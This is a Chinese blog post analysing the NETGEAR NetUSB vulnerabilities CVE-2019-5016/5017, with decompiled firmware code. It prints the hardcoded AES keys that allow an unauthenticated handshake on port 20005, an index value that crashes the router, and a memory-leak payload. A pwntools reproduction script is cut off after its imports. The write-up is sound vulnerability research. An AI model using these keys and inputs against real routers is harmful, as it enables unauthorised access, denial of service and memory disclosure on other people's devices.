<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="路由器,Netgear,信息泄露,DoS," />










<meta name="description" content="之前看到了两个NETGEAR的漏洞，感觉是之前未见过的，所以就分析了一下。因为之前遇到的路由器漏洞大部分都是基于提供http服务的应用层或是更底层的一些漏洞，包括xss、命令注入、绕过身份验证、缓冲区溢出等。而这个漏洞则是出现在一个内核模块NetUSB里面的，值得分析一下。 漏洞定位文章里面提到的是在NETGEAR的R8000和R7900中都存在这个漏洞，这里就拿R8000来分析吧。 去官网看了一">
<meta name="keywords" content="路由器,Netgear,信息泄露,DoS">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-5016&#x2F;5017 NETGEAR NetUSB未授权信息泄露漏洞">
<meta property="og:url" content="https://e3pem.github.io/2019/08/07/IoT/NETGEAR NetUSB未授权信息泄露漏洞/index.html">
<meta property="og:site_name" content="e3pem&#39;s Blog">
<meta property="og:description" content="之前看到了两个NETGEAR的漏洞，感觉是之前未见过的，所以就分析了一下。因为之前遇到的路由器漏洞大部分都是基于提供http服务的应用层或是更底层的一些漏洞，包括xss、命令注入、绕过身份验证、缓冲区溢出等。而这个漏洞则是出现在一个内核模块NetUSB里面的，值得分析一下。 漏洞定位文章里面提到的是在NETGEAR的R8000和R7900中都存在这个漏洞，这里就拿R8000来分析吧。 去官网看了一">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807144139.png">
<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807144656.png">
<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807145510.png">
<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807150751.png">
<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807151523.png">
<meta property="og:updated_time" content="2019-08-07T08:23:24.030Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2019-5016&#x2F;5017 NETGEAR NetUSB未授权信息泄露漏洞">
<meta name="twitter:description" content="之前看到了两个NETGEAR的漏洞，感觉是之前未见过的，所以就分析了一下。因为之前遇到的路由器漏洞大部分都是基于提供http服务的应用层或是更底层的一些漏洞，包括xss、命令注入、绕过身份验证、缓冲区溢出等。而这个漏洞则是出现在一个内核模块NetUSB里面的，值得分析一下。 漏洞定位文章里面提到的是在NETGEAR的R8000和R7900中都存在这个漏洞，这里就拿R8000来分析吧。 去官网看了一">
<meta name="twitter:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807144139.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://e3pem.github.io/2019/08/07/IoT/NETGEAR NetUSB未授权信息泄露漏洞/"/>





  <title>CVE-2019-5016/5017 NETGEAR NetUSB未授权信息泄露漏洞 | e3pem's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">e3pem's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2019/08/07/IoT/NETGEAR NetUSB未授权信息泄露漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="e3pem">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="e3pem's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">CVE-2019-5016/5017 NETGEAR NetUSB未授权信息泄露漏洞</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-07T12:00:00+08:00">
                2019-08-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IoT/" itemprop="url" rel="index">
                    <span itemprop="name">IoT</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>之前看到了两个NETGEAR的漏洞，感觉是之前未见过的，所以就分析了一下。因为之前遇到的路由器漏洞大部分都是基于提供http服务的应用层或是更底层的一些漏洞，包括xss、命令注入、绕过身份验证、缓冲区溢出等。而这个漏洞则是出现在一个内核模块NetUSB里面的，值得分析一下。</p>
<h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>文章里面提到的是在NETGEAR的R8000和R7900中都存在这个漏洞，这里就拿R8000来分析吧。</p>
<p>去官网看了一下，存在漏洞的固件版本竟然还是最新版<code>R8000-V1.0.4.28_10.1.54.chk</code>，这里是<a href="http://www.downloads.netgear.com/files/GDC/R8000/R8000-V1.0.4.28_10.1.54.zip" target="_blank" rel="noopener">下载地址</a>。</p>
<p>下载下来后直接binwalk解压，可以得到一个正常的文件系统：</p>
<pre><code>binwalk -Me R8000-V1.0.4.28_10.1.54.chk
</code></pre><p>漏洞存在于NetUSB.ko中，<code>.ko</code>是内核模块的后缀名，所以全局搜索该文件名，发现果然存在该文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find ./ -name &quot;NetUSB.ko&quot;</span><br><span class="line">./lib/modules/2.6.36.4brcmarm+/kernel/drivers/usbprinter/NetUSB.ko</span><br></pre></td></tr></table></figure></p>
<p>接下来就可以用IDA来分析了！</p>
<h2 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h2><p>该漏洞可以再未授权的情况下实现访问，是怎么做到的呢？原来是该程序将加密用的密钥硬编码到了程序中，只要通过逆向分析就可得到加密密钥，然后就可以和该服务在没有授权的情况下进行正常的交互了。</p>
<p>当与远程的USB设备进行交互的时候，最开始需要一些握手操作，这些操作都是在<code>run_init_sbus</code>函数中实现的，该函数的完整代码太长，这里只贴出关键的部分。我们主要关注的是加解密以及数据的发送与接收操作</p>
<p>首先接收从客户端发送过来的2字节数据，这二字节数据相当于一个标志数据，建立连接时一般为:<code>56 05</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ks_recv(fd, &amp;v60, <span class="number">2</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = <span class="string">"INFO%04X: tcpConnector() receiving error!!!\n"</span>;</span><br><span class="line">  v10 = <span class="number">7760</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着把AES的密钥设置为硬编码的值，也既从v51开始的16字节数据<code>A2353556541CFE44EC468248064DE66C</code>，然后利用该密钥对v47开始的16字节数据<code>0B7928FF6A76223C21A3B794084E1CAD</code>进行解密。把得到的解密结果再次作为AES的密钥，并用其加密从客户端收到的16字节数据，然后把加密得到的16字节数据返回给客户端<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  v51 = <span class="number">0x563535A2</span>;</span><br><span class="line">  v52 = <span class="number">0x44FE1C54</span>;</span><br><span class="line">  v53 = <span class="number">0x488246EC</span>;</span><br><span class="line">  v54 = <span class="number">0x6CE64D06</span>;</span><br><span class="line"></span><br><span class="line">  v47 = <span class="number">0xFF28790B</span>;</span><br><span class="line">  v48 = <span class="number">0x3C22766A</span>;</span><br><span class="line">  v49 = <span class="number">0x94B7A321</span>;</span><br><span class="line">  v50 = <span class="number">0xAD1C4E08</span>;</span><br><span class="line"></span><br><span class="line">LABEL_64:</span><br><span class="line">  <span class="comment">//这里设置了AES的密钥为硬编码的值</span></span><br><span class="line">  aes_set_key(&amp;aeskey, &amp;v51, <span class="number">128</span>);</span><br><span class="line">  <span class="comment">//对另一个16字节数据解密</span></span><br><span class="line">  aes_decrypt(&amp;aeskey, &amp;v47, &amp;v46);</span><br><span class="line">  <span class="comment">//从客户端接收16字节数据</span></span><br><span class="line">  v30 = ks_recv(fd, &amp;v44, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v30 != <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = kc_printf(<span class="string">"INFO%04X: get verifyData error ret:%d sizeof(verifyData)=%d\n"</span>, <span class="number">7837</span>, v30, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//把解密出来的结果作为新的AES密钥</span></span><br><span class="line">  aes_set_key(&amp;aeskey, &amp;v46, <span class="number">128</span>);</span><br><span class="line">  <span class="comment">//用新的密钥加密收到的16字节数据</span></span><br><span class="line">  aes_encrypt(&amp;aeskey, &amp;v44, &amp;buffer);</span><br><span class="line">  <span class="comment">//把加密后的结果发送给客户端</span></span><br><span class="line">  <span class="keyword">if</span> ( ks_send(fd, &amp;buffer, <span class="number">16</span>, <span class="number">0</span>) != <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="string">"INFO%04X: send cryptData error\n"</span>;</span><br><span class="line">    v10 = <span class="number">7848</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>路由器会生成16字节的随机数据，并把该数据作为挑战值发送给客户端，接收客户端计算的结果（其实客户端就是根据自己的密钥对这个随机数据进行加密），如果客户端的密钥和路由器上的一样，那么路由器对客户端计算结果进行解密，得到的应该和生成的随机数一致<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//生成16字节随机数据</span></span><br><span class="line">  get_random_bytes(&amp;v40, <span class="number">4</span>);</span><br><span class="line">  get_random_bytes(&amp;v41, <span class="number">4</span>);</span><br><span class="line">  get_random_bytes(&amp;v42, <span class="number">4</span>);</span><br><span class="line">  get_random_bytes(&amp;v43, <span class="number">4</span>);</span><br><span class="line">  <span class="comment">//发送生成的16字节数据给客户端，相当于一个挑战值，只有在客户端</span></span><br><span class="line">  <span class="comment">//和服务端（路由器）具有相同的密钥时才能根据该挑战值得到正确的结果</span></span><br><span class="line">  <span class="keyword">if</span> ( ks_send(fd, &amp;v40, <span class="number">16</span>, <span class="number">0</span>) != <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="string">"INFO%04X: send randomData error\n"</span>;</span><br><span class="line">    v10 = <span class="number">7864</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//接收客户端根据挑战值计算出来的结果</span></span><br><span class="line">  v12 = ks_recv(fd, &amp;buffer, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 != <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="string">"INFO%04X: get cryptData error ret:%d\n"</span>;</span><br><span class="line">    v14 = <span class="number">7871</span>;</span><br><span class="line">    v15 = v12;</span><br><span class="line">LABEL_40:</span><br><span class="line">    result = kc_printf(v13, v14, v15);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//对收到的16字节数据解密，并比较解密的结果和最开始发送的16字节</span></span><br><span class="line">  <span class="comment">//随机数据是否相等</span></span><br><span class="line">  aes_decrypt(&amp;aeskey, &amp;buffer, &amp;v44);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v44, &amp;v40, <span class="number">0x10</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="string">"INFO%04X: randomData not match!\n"</span>;</span><br><span class="line">    v10 = <span class="number">7879</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>接着会接收4字节数据，该字段为客户端名称的长度busidlen，最长为0x3f，然后会接收busidlen长度的数据<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接收客户端名称长度</span></span><br><span class="line">v15 = ks_recv(fd, &amp;busidlen, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//接收客户端名称</span></span><br><span class="line">v16 = ks_recv(fd, &amp;busid, busidlen, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<p>经过上述过程后，路由器从客户端读取四个字节作为<code>command option</code>，并返回给客户端<code>0x17</code>，表示整个握手过程顺利完成：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v58 = <span class="number">0x17</span>;</span><br><span class="line"><span class="comment">//接收4字节命令</span></span><br><span class="line">v15 = ks_recv(fd, &amp;v57, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( v15 != <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v13 = <span class="string">"INFO%04X: Read command option error %d\n"</span>;</span><br><span class="line">  v14 = <span class="number">7922</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发送握手过程结束的标识</span></span><br><span class="line"><span class="keyword">if</span> ( ks_send(fd, &amp;v58, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = <span class="string">"INFO%04X: send command option error\n"</span>;</span><br><span class="line">  v10 = <span class="number">7930</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从上面的过程来看，我们不需要知道路由器的管理员密码是多少，但是通过这些硬编码的密钥，仍然可以和路由器完成握手操作，所以里在进行后续的操作时是不需要授权的！</p>
<h2 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h2><p>从文章中给出的描述来看，该漏洞是在使用远端设备时，客户端会发送一些操作指令，操作指令的第二个字节为设备编号或者是在栈上可访问的共享设备的索引。通过设置合适的<code>opcode</code>以及设备索引，便可实现信息泄露。关于信息泄露，一共给出了两个CVE，其中CVE-2019-5016可以实现DoS以及内存泄露，CVE-2019-5017能够泄露部分内存地址。</p>
<h3 id="CVE-2019-5016"><a href="#CVE-2019-5016" class="headerlink" title="CVE-2019-5016"></a>CVE-2019-5016</h3><p>该漏洞最基本的是能够实现DoS，只需要将命令的第二个字节（idx）设置为一个较大的值例如(0x8a)，便可让路由器crash重启。主要是利用了<code>NetUSB</code>提供的操作命令中的<code>SoftwareBus_reportConfigDescGot</code>，该函数对应的命令opcode为<code>0x2</code>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">SoftwareBus_processHostCommands</span><span class="params">(<span class="keyword">int</span> result, <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> __int8 *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  v3 = result;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="comment">// here</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      result = SoftwareBus_reportConfigDescGot(result, a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>那设置idx为非法值为什么会造成crash甚至是内存读取呢？跟进<code>SoftwareBus_reportConfigDescGot</code>函数进行分析，该函数的第一个参数是保存的是session信息的指针，第二个参数就是我们输入的4字节命令。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">SoftwareBus_reportConfigDescGot</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> __int8 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v9 = *(_DWORD *)(result + <span class="number">4</span> * command[<span class="number">1</span>] + <span class="number">0x2C</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(_DWORD *)(v9 + <span class="number">0x44</span>);</span><br><span class="line">    v12 = getConfigDescriptor(*(_DWORD *)(v9 + <span class="number">0x44</span>), command[<span class="number">2</span>], (<span class="keyword">unsigned</span> __int8 *)&amp;v20, <span class="number">9</span>, &amp;v21);</span><br><span class="line">    v10 = v12;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从上面的部分代码中可以看到，command[1]就是输入的命令的第二个字节，也就是我们的索引，根据该索引在加上第一个参数的值算出来一个地址，然后把该地址处的值取出来放入v9，然后把<code>v9+0x44</code>这个地址处的四字节值作为参数传给getConfigDescriptor，接着跟进getConfigDescriptor<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v6就是传进来的第一个参数，v7的值设置为0</span></span><br><span class="line"><span class="keyword">if</span> ( *(_WORD *)(v6 + <span class="number">0x120</span>) != <span class="number">0x955</span> || *(_WORD *)(v6 + <span class="number">0x122</span>) != <span class="number">7</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v11 = *(_DWORD *)(*(_DWORD *)(v6 + <span class="number">0x1B4</span>) + <span class="number">4</span> * v7);</span><br><span class="line">  v10 = *(<span class="keyword">unsigned</span> __int8 *)(v11 + <span class="number">2</span>) | (*(<span class="keyword">unsigned</span> __int8 *)(v11 + <span class="number">3</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 这里有一个memcpy的操作，把信息拷贝到目标地址处</span></span><br><span class="line"><span class="built_in">memcpy</span>(v12, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(*(_DWORD *)(v6 + <span class="number">0x1B4</span>) + <span class="number">4</span> * v7), v10);</span><br><span class="line">*a5 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> v5;</span><br></pre></td></tr></table></figure></p>
<p>从上面的分析可以知道，这个过程有很多取地址处的值得操作，后面的这些地址直接受idx的影响。后面只要有任意一处地址指向了非法的内存，程序在访问非法内存的时候就会崩溃，而由于是内核模块的crash，路由器便会直接重启。</p>
<p>对于内存地址读取，这里就不进行分析了，因为这里面有大量的地址相对运算，不进行调试的情况下很难得知哪个地方存放着什么样的值。之前想着获取到路由器的shell，然后通过gdb调试，后来操作的时候才意识到这个是内核模块，是没办法直接用gdb调试的。</p>
<h3 id="CVE-2019-5017"><a href="#CVE-2019-5017" class="headerlink" title="CVE-2019-5017"></a>CVE-2019-5017</h3><p>该漏洞和CVE-2019-5016在本质上没有太大的区别，都是在未授权访问的漏洞的基础上利用NetUSB.ko提供的各种操作命令来达到效果。该漏洞利用的是<code>opcode=0xc</code>这条命令，对应的函数为<code>SoftwareBus_processSetDeviceMaster</code></p>
<p>向路由器发送类似<code>&#39;\x0c\x00&#39;+&#39;a&#39;*0x10</code>这样的数据后便可泄露出来几个内存地址了，后面有复现</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>因为手里刚好有一款R7000的路由器，去官网上下载了一下固件，发现不论是最新版的固件还是之前版本的固件，关于NetUSB.ko的部分都几乎没有变化，而且都存在这个漏洞。（猜测其他Rxxx系列的路由器都存在这个问题）</p>
<p>本次复现采用的固件版本为：<code>V1.0.9.12_1.2.23</code>。之所以选择这个版本的固件，是因为之前研究的时候找到了获取该路由器shell的方式，以为能够通过上传的<code>gdbserver</code>配合<code>gdb-multiarch</code>来对<code>NetUSB</code>调试的，后来才发现调不了。</p>
<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>要与该模块进行交互，就需要知道该往哪个端口发送数据，从之前曝光出来的漏洞可以知道端口是20005，所以直接连一下这个端口，看是否能与其建立连接</p>
<p>由于pwntools用起来比较顺手，直接用它连了一下，发现果然能成功连接，但是没有任何的输出，尝试按照前面分析的未授权访问漏洞的流程发送数据包，最后成功实现了未授权访问</p>
<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807144139.png" alt=""></p>
<p>相关代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="keyword">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line">rn = <span 